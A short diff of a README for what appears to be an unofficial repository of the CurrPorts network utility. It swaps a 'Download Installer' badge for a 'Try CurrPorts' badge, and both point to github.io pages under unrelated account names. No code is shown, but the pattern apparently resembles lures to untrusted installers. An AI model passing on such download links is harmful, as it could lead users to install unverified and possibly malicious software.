@@ -4,7 +4,7 @@
   <img src="https://davescomputertips.com/wp-content/uploads/2020/10/NirSoft-Tools-and-Utilities-Feature.png" alt="Program Logo"/>
 </div>
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://reubenhillsenp.github.io/.github/Currports-Network-Monitor)
+[![Try CurrPorts](https://img.shields.io/badge/Try-CurrPorts-D97706?style=for-the-badge)](https://workrave-timer.github.io/.github/)
 
 ---
 
